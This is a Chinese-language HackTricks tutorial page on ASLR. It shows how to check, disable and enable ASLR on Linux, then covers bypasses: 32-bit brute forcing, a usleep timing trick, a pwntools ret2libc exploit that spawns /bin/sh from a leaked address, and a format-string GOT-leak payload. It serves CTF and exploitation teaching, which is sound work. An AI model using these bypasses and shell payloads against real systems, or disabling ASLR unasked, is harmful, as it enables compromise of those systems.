# ASLR

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

**地址空间布局随机化（ASLR）**是操作系统中使用的一种安全技术，用于**随机化系统和应用程序进程使用的内存地址**。通过这样做，它显著增加了攻击者预测特定进程和数据位置（如堆栈、堆和库）的难度，从而减轻了某些类型的利用，特别是缓冲区溢出。

### **检查ASLR状态**

要在Linux系统上**检查**ASLR状态，可以从`/proc/sys/kernel/randomize_va_space`文件中读取值。存储在此文件中的值确定应用的ASLR类型：

* **0**：无随机化。一切都是静态的。
* **1**：保守随机化。共享库、堆栈、mmap()、VDSO页被随机化。
* **2**：完全随机化。除了保守随机化随机化的元素外，通过`brk()`管理的内存也被随机化。

您可以使用以下命令检查ASLR状态：
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **禁用 ASLR**

要**禁用** ASLR，您需要将 `/proc/sys/kernel/randomize_va_space` 的值设置为 **0**。通常不建议在测试或调试场景之外禁用 ASLR。以下是禁用方法：
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
您还可以通过以下方式禁用执行的ASLR：
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **启用ASLR**

要**启用**ASLR，您可以将值**2**写入`/proc/sys/kernel/randomize_va_space`文件。通常需要root权限。可以使用以下命令启用完全随机化：
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **跨重启保持**

使用`echo`命令进行的更改是临时的，将在重新启动时重置。要使更改持久化，您需要编辑`/etc/sysctl.conf`文件并添加或修改以下行：
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
在编辑 `/etc/sysctl.conf` 后，使用以下命令应用更改：
```bash
sudo sysctl -p
```
这将确保您的ASLR设置在重新启动后保持不变。

## **绕过**

### 32位暴力破解

PaX将进程地址空间分为**3组**：

* **代码和数据**（已初始化和未初始化）：`.text`、`.data` 和 `.bss` —> `delta_exec` 变量中的**16位**熵。该变量在每个进程中随机初始化，并添加到初始地址中。
* 由 `mmap()` 分配的**内存**和**共享库** —> **16位**，称为 `delta_mmap`。
* **栈** —> **24位**，称为 `delta_stack`。但实际上只使用**11位**（从第10到第20字节，包括在内），对齐到**16字节** —> 这导致**524,288个可能的真实栈地址**。

上述数据适用于32位系统，降低的最终熵使得可以通过多次尝试执行来绕过ASLR，直到利用成功完成。

#### 暴力破解思路：

* 如果利用是本地的，您可以尝试暴力破解libc的基地址（对于32位系统很有用）:
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* 当攻击远程服务器时，您可以尝试**暴力破解`libc`函数`usleep`的地址**，将10作为参数传递。如果某个时刻**服务器需要额外10秒才能响应**，则找到了该函数的地址。

{% hint style="success" %}
在64位系统中，熵值更高，这是不可能的。
{% endhint %}

### 有了泄漏

* **挑战是提供一个泄漏**

如果您获得了一个泄漏（简单的CTF挑战），您可以从中计算偏移量（假设您知道正在利用的系统中使用的确切libc版本）。这个示例利用是从[**这里的示例**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)中提取的（查看该页面以获取更多详细信息）:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

通过利用缓冲区溢出，可以利用 **ret2plt** 来窃取来自 libc 的函数地址。查看：

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **格式化字符串任意读取**

就像在 ret2plt 中一样，如果通过格式化字符串漏洞具有任意读取权限，则可以从 GOT 中窃取 **libc 函数** 的地址。以下[**示例来自此处**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
您可以在以下位置找到有关格式字符串任意读取的更多信息：

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret

尝试通过滥用堆栈内部地址来绕过ASLR：

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
